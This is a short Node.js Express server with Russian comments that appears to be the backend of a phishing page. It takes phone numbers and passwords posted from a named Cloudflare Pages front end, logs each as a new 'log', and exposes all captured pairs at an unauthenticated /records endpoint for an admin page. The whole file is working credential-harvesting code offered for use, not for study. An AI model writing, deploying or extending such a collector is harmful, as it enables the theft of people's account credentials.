// ==== ПОДКЛЮЧЕНИЯ ====
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// ==== CORS: РАЗРЕШАЕМ ТВОЙ НОВЫЙ FRONT ====
app.use(
  cors({
    origin: [
      "https://front-1wp.pages.dev",   // 🔥 твой Cloudflare Pages
      "http://localhost:3000"          // для теста на локалке
    ],
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"]
  })
);

// ===== БАЗА ДАННЫХ В ПАМЯТИ (как было) =====
let records = [];

// ====== ПОЛУЧЕНИЕ ВСЕХ ЗАПИСЕЙ (для admin.html) ======
app.get("/records", (req, res) => {
  res.json(records);
});

// ====== ПОЛУЧЕНИЕ ПОСЛЕДНЕЙ ЗАПИСИ ======
app.get("/records/latest", (req, res) => {
  if (records.length === 0) {
    return res.json({});
  }
  res.json(records[records.length - 1]);
});

// ====== ДОБАВИТЬ ДАННЫЕ ОТ ПОЛЬЗОВАТЕЛЯ ======
app.post("/submit", (req, res) => {
  const data = {
    phone: req.body.phone || null,
    password: req.body.password || null,
    time: new Date().toLocaleString("ru-RU"),
    id: records.length + 1
  };

  records.push(data);

  console.log("🔥 Новый лог:", data);

  res.json({ success: true });
});

// ===== РУЧНАЯ ПРОВЕРКА СЕРВЕРА =====
app.get("/", (req, res) => {
  res.send("Backend работает 🙂 Render ONLINE");
});

// ===== СТАРТ СЕРВЕРА НА РЕНДЕР =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Сервер запущен на Render:", PORT);
});

